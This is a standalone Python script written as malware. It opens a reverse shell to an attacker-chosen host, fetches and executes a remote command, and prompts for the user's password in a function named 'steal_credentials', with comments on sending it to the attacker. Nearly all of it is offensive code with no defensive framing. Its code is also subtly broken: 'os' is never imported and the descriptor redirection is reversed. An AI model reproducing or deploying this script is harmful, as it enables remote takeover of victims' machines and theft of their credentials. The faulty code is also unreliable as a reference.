import socket
import subprocess
import getpass

# Reverse Shell Function
def reverse_shell(host, port):
    try:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the attacker's machine
        s.connect((host, port))
        
        # Create a subprocess
        process = subprocess.Popen(["/bin/sh", "-i"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Send and receive data between subprocess and attacker
        os.dup2(process.stdin.fileno(), s.fileno())
        os.dup2(process.stdout.fileno(), s.fileno())
        os.dup2(process.stderr.fileno(), s.fileno())
        
        # Wait for the subprocess to complete
        process.wait()
        
    except Exception as e:
        print("An error occurred during reverse shell:", str(e))
        
    finally:
        # Close the socket connection
        s.close()

# Function to steal login credentials
def steal_credentials():
    try:
        # Get the user's login credentials
        username = getpass.getuser()
        password = getpass.getpass()

        # Validate and process the credentials (implement your own logic here)
        if username and password:
            # Send the credentials to the attacker (implement your own logic here)
            # Example: You can establish a socket connection to the attacker's machine and send the credentials
            #         or make an HTTP request to a remote server to store the credentials
            print("Credentials:", username, password)
        else:
            print("Invalid credentials. Could not steal.")

    except Exception as e:
        print("An error occurred during credential stealing:", str(e))

# Main function
def main():
    try:
        # Set the attacker's IP address and port for the reverse shell
        attacker_ip = input("Enter attacker IP address: ")
        attacker_port = int(input("Enter attacker port: "))

        # Set the remote host and port for receiving commands
        remote_host = input("Enter remote host IP address: ")
        remote_port = int(input("Enter remote host port: "))

        # Perform reverse shell
        reverse_shell(attacker_ip, attacker_port)

        # Connect to the remote host and execute commands
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the remote host
            s.connect((remote_host, remote_port))

            # Receive the data (command) from the remote host
            command = s.recv(1024).decode()

            # Execute the received command
            os.system(command)

        except Exception as e:
            print("An error occurred during remote command execution:", str(e))
        
        finally:
            # Close the socket connection
            s.close()

        # Steal login credentials
        steal_credentials()

    except Exception as e:
        print("An error occurred in the main function:", str(e))

# Run the main function
if __name__ == "__main__":
    main()
